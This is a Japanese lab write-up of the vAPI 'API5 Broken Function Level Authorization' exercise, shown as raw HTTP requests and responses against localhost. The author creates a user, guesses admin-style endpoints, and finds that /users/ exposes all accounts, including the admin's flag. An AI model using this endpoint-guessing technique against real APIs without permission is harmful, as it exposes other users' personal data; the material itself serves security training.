# API5 Broken Function Level Authorization
一般ユーザや匿名ユーザがアクセスできないエンドポイントは攻撃者もアクセスできない。  
ただし、認可制御が正しく行えていない場合はURLを推測することで攻撃を受ける可能性がある。

ユーザ作成APIを実行。
```http
POST /vapi/api5/user HTTP/1.1
Content-Type: application/json
User-Agent: PostmanRuntime/7.29.0
Accept: */*
Postman-Token: 4152587f-1a50-4e37-b97c-d3b88f72e05e
Host: localhost
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 135

{
    "username":"testuser2",
    "password":"test123",
    "name":"Test User",
    "address":"ABC",
    "mobileno":"888888888"
}
```
```http
HTTP/1.1 201 Created
Host: localhost
Date: Sat, 05 Mar 2022 13:55:57 GMT
Connection: close
X-Powered-By: PHP/7.4.7
Cache-Control: no-cache, private
Date: Sat, 05 Mar 2022 13:55:57 GMT
Content-Type: application/json

{"username":"testuser2","name":"Test User","address":"ABC","mobileno":"888888888","id":2}
```

作成したユーザの情報を取得するAPIを実行する。
```http
GET /vapi/api5/user/2 HTTP/1.1
Authorization-Token: dGVzdHVzZXIyOnRlc3QxMjM=
User-Agent: PostmanRuntime/7.29.0
Accept: */*
Postman-Token: 9370f396-423e-4e19-a769-ea1e43c5bcb8
Host: localhost
Accept-Encoding: gzip, deflate
Connection: close

```
```http
HTTP/1.1 200 OK
Host: localhost
Date: Sat, 05 Mar 2022 13:56:49 GMT
Connection: close
X-Powered-By: PHP/7.4.7
Cache-Control: no-cache, private
Date: Sat, 05 Mar 2022 13:56:49 GMT
Content-Type: application/json

{"id":2,"username":"testuser2","name":"Test User","address":"ABC","mobileno":"888888888"}
```

管理機能と書いているので`admin`などを試してみるが、エラーになる。
```http
GET /vapi/api5/admin/ HTTP/1.1
Authorization-Token: dGVzdHVzZXIyOnRlc3QxMjM=
User-Agent: PostmanRuntime/7.29.0
Accept: */*
Postman-Token: 9370f396-423e-4e19-a769-ea1e43c5bcb8
Host: localhost
Accept-Encoding: gzip, deflate
Connection: close

```
```http
HTTP/1.0 500 Internal Server Error
Host: localhost
Date: Sat, 05 Mar 2022 14:04:59 GMT
Connection: close
X-Powered-By: PHP/7.4.7
Cache-Control: no-cache, private
Date: Sat, 05 Mar 2022 14:04:59 GMT
Content-Type: application/json

{}
```

ひとしきり試してあきらめかけたが`users`が正解だったようで過剰なデータが取れた。
```http
GET /vapi/api5/users/ HTTP/1.1
Authorization-Token: dGVzdHVzZXIyOnRlc3QxMjM=
User-Agent: PostmanRuntime/7.29.0
Accept: */*
Postman-Token: 9370f396-423e-4e19-a769-ea1e43c5bcb8
Host: localhost
Accept-Encoding: gzip, deflate
Connection: close

```http
HTTP/1.1 200 OK
Host: localhost
Date: Sat, 05 Mar 2022 14:06:21 GMT
Connection: close
X-Powered-By: PHP/7.4.7
Cache-Control: no-cache, private
Date: Sat, 05 Mar 2022 14:06:21 GMT
Content-Type: application/json

[{"id":1,"username":"admin","name":"Admin User","address":"flag{api5_76dd990a97ff1563ae76}","mobileno":"8080808080"},{"id":2,"username":"testuser2","name":"Test User","address":"ABC","mobileno":"888888888"}]
```
